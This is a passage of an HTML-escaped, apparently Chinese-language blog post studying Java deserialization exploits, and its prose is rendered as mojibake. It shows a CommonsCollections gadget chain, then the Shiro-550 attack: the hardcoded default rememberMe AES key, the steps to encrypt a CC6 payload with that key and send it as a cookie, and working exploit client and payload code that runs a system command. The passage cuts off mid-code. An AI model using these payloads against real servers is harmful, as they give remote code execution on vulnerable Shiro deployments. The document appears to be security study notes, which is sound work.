&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TrAXFilter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">Templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;xxxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="cck1shiro-550">CCK1(Shiro-550)&lt;/h2>
&lt;p>pç‰›ç»™å‡ºäº†ä¸€ä¸ª&lt;a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">å°demo&lt;/a>ï¼Œåªæœ‰ä¸¤ä¸ªjspï¼Œä¾èµ–æœ‰è¿™äº›&lt;/p>
&lt;ul>
&lt;li>shiro-coreã€shiro-webï¼Œè¿™æ˜¯shiroæœ¬èº«çš„ä¾èµ–&lt;/li>
&lt;li>javax.servlet-apiã€jsp-apiï¼Œè¿™æ˜¯JSPå’ŒServletçš„ä¾èµ–ï¼Œä»…åœ¨ç¼–è¯‘é˜¶æ®µä½¿ç”¨ï¼Œå› ä¸ºTomcatä¸­è‡ªå¸¦è¿™ä¸¤ä¸ªä¾èµ–&lt;/li>
&lt;li>slf4j-apiã€slf4j-simpleï¼Œè¿™æ˜¯ä¸ºäº†æ˜¾ç¤ºshiroä¸­çš„æŠ¥é”™ä¿¡æ¯æ·»åŠ çš„ä¾èµ–&lt;/li>
&lt;li>commons-loggingï¼Œè¿™æ˜¯shiroä¸­ç”¨åˆ°çš„ä¸€ä¸ªæŽ¥å£ï¼Œä¸æ·»åŠ ä¼šçˆ†java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactoryé”™è¯¯&lt;/li>
&lt;li>commons-collectionsï¼Œä¸ºäº†æ¼”ç¤ºååºåˆ—åŒ–æ¼æ´žï¼Œå¢žåŠ äº†commons-collectionsä¾èµ–ï¼Œç‰ˆæœ¬ä¸º3.2.1&lt;/li>
&lt;/ul>
&lt;p>æ‰“waråŒ…åŽéƒ¨ç½²åœ¨æœ¬åœ°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301201435981.png" alt="image-20220301201435981">&lt;/p>
&lt;p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°ï¼Œä¸å‹¾é€‰&lt;code>Remember Me&lt;/code>æ—¶cookieæœ‰rememberMe=deleteMeï¼Œå‹¾é€‰çš„è¯åˆ™æ˜¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301202246982.png" alt="image-20220301202246982">&lt;/p>
&lt;p>è¿™é‡Œçš„b64åŠ å¯†ä¿¡æ¯æ˜¯AESï¼Œåœ¨&lt;code>org.apache.shiro.mgt.AbstractRememberMeManager&lt;/code>ä¸­å¯ä»¥çœ‹åˆ°é»˜è®¤key&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232709437.png" alt="image-20220301232709437">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232313280.png" alt="image-20220301232313280">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°å®ƒåœ¨åŒåçš„æž„é€ å‡½æ•°ä¸­è®¾ç½®äº†è¿™ä¸ªdefault keyï¼Œè€ŒæŽ§åˆ¶cookieä¿¡æ¯&lt;code>org.apache.shiro.web.mgt.CookieRememberMeManager&lt;/code>ç»§æ‰¿äº†è¿™ä¸ªç±»&lt;/p>
&lt;p>ç”±äºŽå®ƒä½¿ç”¨äº†é»˜è®¤keyå¹¶ä¸”ç”¨äº†ccä¾èµ–ï¼Œæˆ‘ä»¬çš„æ”»å‡»è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š&lt;/p>
&lt;ul>
&lt;li>ç”¨CCé“¾ç”Ÿæˆpayload&lt;/li>
&lt;li>ç”¨Shiroé»˜è®¤keyè¿›è¡ŒåŠ å¯†&lt;/li>
&lt;li>å°†å¯†æ–‡ä½œä¸ºrememberMeçš„Cookieå‘é€ç»™æœåŠ¡ç«¯&lt;/li>
&lt;/ul>
&lt;h3 id="cc6ä¸ºä»€ä¹ˆä¸è¡Œ">CC6ä¸ºä»€ä¹ˆä¸è¡Œ&lt;/h3>
&lt;p>pç‰›å†™äº†ä¸€ä¸ªåŸºäºŽCC6çš„exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">com.govuln.shiroattack&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.crypto.AesCipherService&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.util.ByteSource&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client0&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#f92672">[]&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">payloads&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CommonsCollections6&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;whoami&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AesCipherService&lt;/span> &lt;span style="color:#111">aes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AesCipherService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteSource&lt;/span> &lt;span style="color:#111">ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">aes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">payloads&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ciphertext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">com.govuln.shiroattack&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections6&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
